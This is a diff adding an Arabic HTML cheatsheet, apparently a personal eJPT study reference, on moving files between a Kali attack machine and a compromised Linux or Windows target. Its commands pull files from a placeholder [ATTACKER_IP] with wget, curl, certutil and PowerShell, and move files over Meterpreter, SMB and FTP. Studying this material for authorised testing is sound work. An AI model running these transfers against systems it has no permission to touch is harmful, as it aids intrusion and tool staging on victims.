@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+
+<html dir="rtl" lang="ar">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<title>File Transfer Cheatsheet</title>
+<style>
+:root{
+  --bg:#0b0b0b;
+  --panel:#141414;
+  --panel-2:#1a1a1a;
+  --border:#2b2b2b;
+  --gold:#d4af37;
+  --gold-dim:#8a712a;
+  --yellow:#e8c547;
+  --text:#e9e6da;
+  --text-dim:#a19c8c;
+  --mono:#f2e6b8;
+  --green:#7fae4a;
+  --red:#b5544a;
+}
+*{box-sizing:border-box;}
+body{
+  background:var(--bg);
+  color:var(--text);
+  font-family:"Tahoma","Segoe UI",sans-serif;
+  margin:0;
+  padding:0 0 4rem;
+  line-height:1.7;
+}
+.wrap{max-width:900px;margin:0 auto;padding:2rem 1.5rem;}
+
+.hero{border-bottom:1px solid var(--border);padding-bottom:1.5rem;margin-bottom:2rem;}
+.hero .tag{display:inline-block;font-family:"Consolas","Courier New",monospace;font-size:13px;color:var(--bg);background:var(--gold);padding:2px 10px;border-radius:3px;margin-bottom:10px;letter-spacing:.5px;}
+.hero h1{font-size:30px;margin:0 0 6px;color:var(--yellow);}
+.hero p{color:var(--text-dim);margin:0;font-size:14px;}
+.signature{display:inline-flex;align-items:center;gap:6px;margin-top:14px;font-family:"Consolas",monospace;font-size:11.5px;color:var(--gold-dim);border:1px solid var(--border);padding:4px 10px;border-radius:20px;}
+.signature b{color:var(--gold);font-weight:normal;}
+
+.stage{margin-bottom:2.2rem;background:var(--panel);border:1px solid var(--border);border-right:3px solid var(--gold);border-radius:6px;padding:1.2rem 1.4rem;}
+.stage h2{color:var(--gold);font-size:19px;margin:0 0 4px;display:flex;align-items:center;gap:8px;}
+.stage .desc{color:var(--text-dim);font-size:13.5px;margin:0 0 14px;}
+
+h3.sub{color:var(--yellow);font-size:15px;margin:18px 0 8px;border-bottom:1px dashed var(--border);padding-bottom:5px;}
+h3.sub:first-of-type{margin-top:0;}
+
+.step{margin-bottom:14px;padding-bottom:14px;border-bottom:1px dashed var(--border);}
+.step:last-child{border-bottom:none;margin-bottom:0;padding-bottom:0;}
+.step-title{font-size:14.5px;color:var(--text);margin-bottom:6px;font-weight:bold;}
+.where{display:inline-block;font-family:"Consolas","Courier New",monospace;font-size:11px;background:var(--panel-2);color:var(--yellow);border:1px solid var(--gold-dim);padding:1px 8px;border-radius:10px;margin-inline-start:8px;vertical-align:middle;}
+.cmd{background:#0e0e0e;border:1px solid var(--border);border-radius:5px;padding:10px 14px;font-family:"Consolas","Courier New",monospace;font-size:13.5px;color:var(--mono);direction:ltr;text-align:left;overflow-x:auto;margin:6px 0;white-space:pre;}
+.cmd .cm{color:#6b6b6b;}
+.note{font-size:12.5px;color:var(--text-dim);margin-top:4px;}
+.note b{color:var(--yellow);font-weight:normal;}
+.tip{background:rgba(212,175,55,.08);border-inline-start:2px solid var(--gold);padding:8px 12px;font-size:12.5px;color:var(--text-dim);border-radius:3px;margin-top:8px;}
+.danger{background:rgba(181,84,74,.08);border-inline-start:2px solid var(--red);padding:8px 12px;font-size:12.5px;color:var(--text-dim);border-radius:3px;margin-top:8px;}
+.result{font-size:12.5px;color:var(--green);margin-top:6px;font-family:"Consolas","Courier New",monospace;direction:ltr;text-align:left;}
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:10px;}
+@media (max-width:640px){.grid2{grid-template-columns:1fr;}}
+
+.toc{background:var(--panel);border:1px solid var(--border);border-radius:6px;padding:1rem 1.3rem;margin-bottom:2rem;font-size:13.5px;}
+.toc .ttl{color:var(--yellow);font-weight:bold;margin-bottom:8px;display:block;}
+.toc ol{margin:0;padding-inline-start:20px;color:var(--text-dim);}
+.toc li{margin-bottom:4px;}
+.toc a{color:var(--text-dim);text-decoration:none;}
+.toc a:hover{color:var(--yellow);}
+
+.portnote{background:var(--panel-2);border:1px solid var(--gold-dim);border-radius:6px;padding:.8rem 1.1rem;margin-bottom:2rem;font-size:13px;color:var(--text-dim);}
+.portnote b{color:var(--yellow);}
+
+.badge{display:inline-block;font-size:10px;padding:1px 7px;border-radius:8px;margin-inline-start:6px;font-family:"Consolas",monospace;vertical-align:middle;}
+.badge.win{background:#1c2733;color:#8fb3ff;border:1px solid #2e4560;}
+.badge.lin{background:#1a2417;color:#9fd97b;border:1px solid #33502a;}
+
+footer{text-align:center;color:var(--text-dim);font-size:11.5px;margin-top:3rem;padding-top:1.2rem;border-top:1px solid var(--border);}
+footer .author{color:var(--gold);font-size:13px;margin-bottom:6px;}
+footer .disclaimer{max-width:560px;margin:0 auto;color:#7a7666;font-size:11px;line-height:1.6;}
+</style>
+</head>
+<body>
+<div class="wrap">
+<div class="hero">
+<span class="tag">GENERAL — FILE TRANSFER</span>
+<h1>File Transfer — نقل الملفات بين Kali والهدف</h1>
+<p>مرجع عملي سريع: اختر القناة المناسبة → انقل الملف → تحقق من سلامته → انتقل للخطوة التالية.</p>
+<div class="signature">✒ <b>Abdullah Nasser Almsan</b> — Personal Pentest Reference</div>
+</div>
+<div class="portnote">
+<b>الفكرة الأساسية:</b> لا يوجد Port واحد لـFile Transfer. استخدم القناة الموجودة فعليًا: HTTP، SMB، FTP/TFTP أو Meterpreter.
+  الأفضل دائمًا أبسط طريقة تعمل داخل الـLab بدون إنشاء Services إضافية غير لازمة.
+</div>
+<div class="toc"><span class="ttl">الفهرس</span><ol><li><a href="#s1">Choose Method / Available Tools</a></li><li><a href="#s2">Kali-hosted HTTP</a></li><li><a href="#s3">Kali ↔ Linux</a></li><li><a href="#s4">Kali ↔ Windows</a></li><li><a href="#s5">SMB / FTP / TFTP / Meterpreter</a></li><li><a href="#s6">Integrity Verification &amp; Cleanup</a></li></ol></div>
+<div class="stage" id="s1"><h2>1. Choose Method / Available Tools</h2>
+<p class="desc">قبل النقل حدّد اتجاه الملف، نوع الجلسة، عنوان جهازك، والمسار القابل للكتابة على الهدف.</p>
+<div class="tip"><b>Workflow:</b> Source → Destination → Writable Path → Available Tool → Transfer → Verify.</div><div class="step"><div class="step-title">تحديد عنوان جهاز الهجوم <span class="where">KALI TERMINAL</span></div><div class="cmd">ip a
+ip route</div><div class="note">استخدم عنوان الواجهة التي يستطيع الهدف الوصول إليها، خصوصًا مع VPN/Lab.</div></div><div class="step"><div class="step-title">اختبار المسار القابل للكتابة <span class="where">VICTIM SHELL</span></div><div class="cmd">pwd
+ls -ld .
+ls -ld /tmp</div><div class="note">استخدم مجلدًا تملك الكتابة عليه، ولا تكتب فوق ملفات موجودة.</div></div><div class="step"><div class="step-title">إيقاف HTTP Server بعد الانتهاء <span class="where">KALI TERMINAL</span></div><div class="cmd">Ctrl+C</div><div class="note">أوقف الخادم المؤقت عندما تنتهي حتى لا تترك Service مفتوحة بدون حاجة.</div></div></div>
+<div class="stage" id="s2"><h2>2. Kali-hosted HTTP</h2>
+<p class="desc">هذه المرحلة هنا للتأكد أن قناة النقل نفسها قابلة للوصول قبل أن تضيع وقتك في أوامر التحميل.</p>
+<div class="danger">لا تفتح Listener أو Service على شبكة غير مصرح بها. هذا الملف مخصص للـLab والاختبارات المصرح بها فقط.</div><div class="step"><div class="step-title">اختبار الوصول إلى HTTP Server على جهازك <span class="where">KALI TERMINAL</span></div><div class="cmd">python3 -m http.server [PORT] --bind [ATTACKER_IP]</div><div class="note">شغّل الأمر داخل المجلد الذي يحتوي الملف المطلوب نقله. اترك النافذة مفتوحة أثناء التحميل.</div></div><div class="step"><div class="step-title">فحص الوصول إلى بورت HTTP من الهدف <span class="where">VICTIM SHELL</span></div><div class="cmd">curl -I http://[ATTACKER_IP]:[PORT]/</div><div class="note">استخدمه فقط إذا curl موجود. فشل الاتصال قد يعني Routing/Firewall/Port خطأ.</div></div><div class="step"><div class="step-title">تشغيل Web Server من مجلد الملف <span class="where">KALI TERMINAL</span></div><div class="cmd">cd [DIR]
+python3 -m http.server [PORT] --bind [ATTACKER_IP]</div><div class="note">ضع [FILE] داخل [DIR] قبل تشغيل الخادم.</div></div></div>
+<div class="stage" id="s3"><h2>3. Kali ↔ Linux</h2>
+<p class="desc">اعرف الأدوات المتاحة على الهدف واختر أبسط طريقة موجودة بدل محاولة تثبيت أدوات جديدة.</p>
+
+
+
+
+
+<div class="tip">اختيار سريع: Linux → wget/curl. Windows → PowerShell أو certutil. Meterpreter → upload/download. خدمة SMB/FTP موجودة أصلًا → استخدمها إذا كانت الصلاحيات تسمح.</div><div class="step"><div class="step-title">تأكيد نوع الجلسة الحالية على Linux <span class="where">VICTIM SHELL</span></div><div class="cmd">whoami
+pwd
+id</div><div class="note">اعرف المستخدم الحالي والمسار قبل اختيار مكان حفظ الملف.</div></div><div class="step"><div class="step-title">البحث عن curl/wget/python <span class="where">VICTIM SHELL</span></div><div class="cmd">which curl
+which wget
+which python3
+which python</div><div class="note">وجود أي واحدة منها يكفي غالبًا لبناء مسار HTTP بسيط.</div></div><div class="step"><div class="step-title">Linux — تنزيل عبر wget <span class="where">VICTIM SHELL</span></div><div class="cmd">wget http://[ATTACKER_IP]:[PORT]/[FILE] -O [FILE]</div><div class="result">وجود الملف محليًا بدون خطأ نقل = نجاح المسار، ثم انتقل للتحقق في المرحلة 6.</div></div><div class="step"><div class="step-title">Linux — تنزيل عبر curl <span class="where">VICTIM SHELL</span></div><div class="cmd">curl -o [FILE] http://[ATTACKER_IP]:[PORT]/[FILE]</div><div class="note">بديل مباشر إذا wget غير موجود.</div></div></div>
+<div class="stage" id="s4"><h2>4. Kali ↔ Windows</h2>
+<p class="desc">النقل عبر HTTP المباشر غالبًا لا يحتاج Credentials. هذه المرحلة تنطبق عندما تستخدم SMB/FTP أو خدمة تحتاج حسابًا معروفًا.</p>
+<div class="danger">لا تستخدم Password Spraying أو Brute Force داخل ملف File Transfer. اختبار كلمات المرور له ملفات الخدمة نفسها.</div><div class="step"><div class="step-title">تأكيد نوع الجلسة الحالية على Windows <span class="where">WINDOWS CMD</span></div><div class="cmd">whoami
+cd
+echo %TEMP%</div><div class="note">مجلد %TEMP% غالبًا مناسب للملفات المؤقتة إذا كانت الصلاحيات تسمح.</div></div><div class="step"><div class="step-title">Windows — اختبار الوصول إلى HTTP <span class="where">POWERSHELL</span></div><div class="cmd">Invoke-WebRequest -Uri http://[ATTACKER_IP]:[PORT]/ -Method Head</div><div class="note">إذا كانت السياسة أو نسخة PowerShell تمنع الطلب، جرّب طريقة النقل الأخرى بدل افتراض أن الشبكة لا تعمل.</div></div><div class="step"><div class="step-title">التأكد من PowerShell <span class="where">WINDOWS CMD</span></div><div class="cmd">where powershell</div></div><div class="step"><div class="step-title">التأكد من certutil <span class="where">WINDOWS CMD</span></div><div class="cmd">where certutil</div><div class="note">certutil أداة Windows أصلية وقد تكون متاحة حتى عندما لا تريد استخدام PowerShell.</div></div><div class="step"><div class="step-title">فحص مجلد الحفظ <span class="where">WINDOWS CMD</span></div><div class="cmd">echo %TEMP%
+dir %TEMP%</div></div><div class="step"><div class="step-title">Windows — certutil download <span class="where">WINDOWS CMD</span></div><div class="cmd">certutil -urlcache -split -f http://[ATTACKER_IP]:[PORT]/[FILE] [FILE]</div><div class="note">هذا File Transfer وليس HTTP Enumeration.</div></div></div>
+<div class="stage" id="s5"><h2>5. SMB / FTP / TFTP / Meterpreter</h2>
+<p class="desc">هنا التنفيذ الفعلي للنقل. اختر المسار المطابق لنظام الهدف والأداة المتاحة.</p>
+
+
+
+
+
+
+
+
+
+<div class="danger"><b>مهم:</b> لا تعتبر نجاح أمر النقل إثباتًا كافيًا. تحقق من الحجم/الهاش في المرحلة التالية قبل استخدام الملف.</div><div class="step"><div class="step-title">تأكيد Meterpreter والسياق <span class="where">METERPRETER</span></div><div class="cmd">getuid
+pwd</div><div class="note">إذا كنت داخل Meterpreter يمكنك استخدام upload/download مباشرة بدون إنشاء Web Server.</div></div><div class="step"><div class="step-title">فحص SMB/FTP عند استخدام خدمة موجودة <span class="where">KALI TERMINAL</span></div><div class="cmd">nmap -Pn -p21,445 -sV [TARGET]</div><div class="note">استخدم هذا فقط إذا قررت النقل عبر FTP/SMB الموجودين على الهدف.</div></div><div class="step"><div class="step-title">عرض أوامر النقل المتاحة <span class="where">METERPRETER</span></div><div class="cmd">help upload
+help download</div><div class="tip">إذا Meterpreter موجود، upload/download عادة أبسط من إنشاء قناة نقل ثانية.</div></div><div class="step"><div class="step-title">SMB — اختبار Credentials معروفة قبل النقل <span class="where">KALI TERMINAL</span></div><div class="cmd">smbclient //[TARGET]/[SHARE] -U [USERNAME]</div><div class="note">أدخل كلمة المرور المعروفة عند الطلب. لا تعمل Brute Force هنا؛ الهدف فقط إثبات أن الحساب يسمح بالدخول.</div></div><div class="step"><div class="step-title">SMBMap — التحقق من الصلاحيات <span class="where">KALI TERMINAL</span></div><div class="cmd">smbmap -H [TARGET] -u [USERNAME] -p [PASSWORD]</div><div class="note">ابحث عن Read/Write على الـShare المطلوب قبل upload/download.</div></div><div class="step"><div class="step-title">FTP — الدخول ببيانات معروفة <span class="where">KALI TERMINAL</span></div><div class="cmd">ftp [TARGET]</div><div class="note">بعد الاتصال استخدم Username/Password المعروفين فقط. إذا فشل الدخول ارجع لملف FTP بدل خلط Password Attacks مع File Transfer.</div></div><div class="step"><div class="step-title">Meterpreter — لا يحتاج Credential إضافي <span class="where">METERPRETER</span></div><div class="cmd">getuid</div><div class="note">وجود Session قائمة يعني أن النقل يستخدم نفس الجلسة الحالية، وليس Login جديدًا.</div></div><div class="step"><div class="step-title">رفع ملف من Kali إلى الهدف <span class="where">METERPRETER</span></div><div class="cmd">upload [FILE] [REMOTE_PATH]</div><div class="note">استخدم مسارًا تملك الكتابة عليه.</div></div><div class="step"><div class="step-title">تنزيل ملف من الهدف إلى Kali <span class="where">METERPRETER</span></div><div class="cmd">download [REMOTE_PATH] [FILE]</div><div class="note">احفظ الملف محليًا باسم واضح لتجنب الخلط بين النسخ.</div></div><div class="step"><div class="step-title">SMBMap — رفع وتنزيل <span class="where">KALI TERMINAL</span></div><div class="cmd">smbmap -H [TARGET] -u [USERNAME] -p [PASSWORD] --upload '[FILE]' '[SHARE]\[FILE]'
+smbmap -H [TARGET] -u [USERNAME] -p [PASSWORD] --download '[SHARE]\[FILE]'</div><div class="note">نفّذ الرفع فقط إذا Enumeration أكد Write على الـShare.</div></div><div class="step"><div class="step-title">smbclient — put/get داخل الجلسة <span class="where">SMBCLIENT</span></div><div class="cmd">put [FILE]
+get [FILE]</div><div class="note">ادخل الـShare أولًا ثم استخدم put للرفع وget للتنزيل.</div></div><div class="step"><div class="step-title">FTP — تنزيل ملف داخل الجلسة <span class="where">FTP CLIENT</span></div><div class="cmd">binary
+get [FILE]</div><div class="note">استخدم binary للملفات الثنائية حتى لا تتلف أثناء النقل.</div></div><div class="step"><div class="step-title">FTP — رفع ملف داخل الجلسة <span class="where">FTP CLIENT</span></div><div class="cmd">binary
+put [FILE]</div><div class="danger">لا ترفع ملفًا إلا إذا كان لديك Write Access ومطلوبًا في اللاب.</div></div><div class="step"><div class="step-title">TFTP — تنزيل ملف معروف <span class="where">TFTP CLIENT</span></div><div class="cmd">get [FILE]</div><div class="note">TFTP لا يدعم Directory Listing قياسيًا؛ استخدم اسم ملف معروف من سياق اللاب.</div></div><div class="step"><div class="step-title">تأكيد الملف بعد Upload <span class="where">METERPRETER</span></div><div class="cmd">ls [REMOTE_PATH]</div></div></div>
+<div class="stage" id="s6"><h2>6. Integrity Verification &amp; Cleanup</h2>
+<p class="desc">بعد النقل تحقق أن الملف وصل صحيحًا، ثم نفّذ فقط ما يحتاجه اللاب.</p>
+
+
+
+
+
+<div class="tip"><b>Next Action:</b> الملف أداة Enumeration؟ → شغّلها فقط ضمن Scope. ملف Evidence؟ → خزّنه محليًا. ملف Config/Credential؟ → انتقل إلى Credential Access. لا تكرر Post-Exploitation كامل هنا.</div><div class="danger">لا تحذف ملفات نظام، لا تستبدل ملفات إنتاج، ولا تنشئ Persistence لمجرد نجاح النقل.</div><div class="step"><div class="step-title">Windows — PowerShell download <span class="where">POWERSHELL</span></div><div class="cmd">Invoke-WebRequest -Uri http://[ATTACKER_IP]:[PORT]/[FILE] -OutFile [FILE]</div><div class="note">نفّذه داخل مجلد قابل للكتابة مثل %TEMP% أو مسار اللاب المخصص.</div></div><div class="step"><div class="step-title">تأكيد وجود الملف وحجمه <span class="where">VICTIM SHELL</span></div><div class="cmd">ls -lh [FILE]
+file [FILE]</div><div class="note">تأكد أن الحجم ونوع الملف منطقيان.</div></div><div class="step"><div class="step-title">حساب SHA-256 على Linux <span class="where">VICTIM SHELL</span></div><div class="cmd">sha256sum [FILE]</div><div class="note">قارن الهاش مع النسخة الأصلية على Kali إذا أردت تأكيد سلامة النقل.</div></div><div class="step"><div class="step-title">حساب SHA-256 على Kali <span class="where">KALI TERMINAL</span></div><div class="cmd">sha256sum [FILE]</div></div><div class="step"><div class="step-title">تأكيد وجود الملف <span class="where">WINDOWS CMD</span></div><div class="cmd">dir [FILE]</div></div><div class="step"><div class="step-title">حساب SHA-256 على Windows <span class="where">POWERSHELL</span></div><div class="cmd">Get-FileHash [FILE] -Algorithm SHA256</div><div class="note">تطابق الهاش مع النسخة الأصلية يعني أن النقل تم بدون تغيير.</div></div></div>
+<footer>
+<div class="author">أُعدّ بواسطة Abdullah Nasser Almsan</div>
+<div class="disclaimer">
+    هذا الملف مرجع تقني شخصي مُعدّ لأغراض التعلّم واجتياز اختبارات الاختراق المرخّصة (زي EJPT) فقط.
+    يُستخدم حصرًا داخل بيئات Lab أو أنظمة مصرّح باختبارها رسميًا.
+    مُعدّه غير مسؤول عن أي استخدام خاطئ أو غير قانوني لهذا المحتوى خارج هذا النطاق.
+  </div>
+</footer>
+</div>
+</body>
+</html>
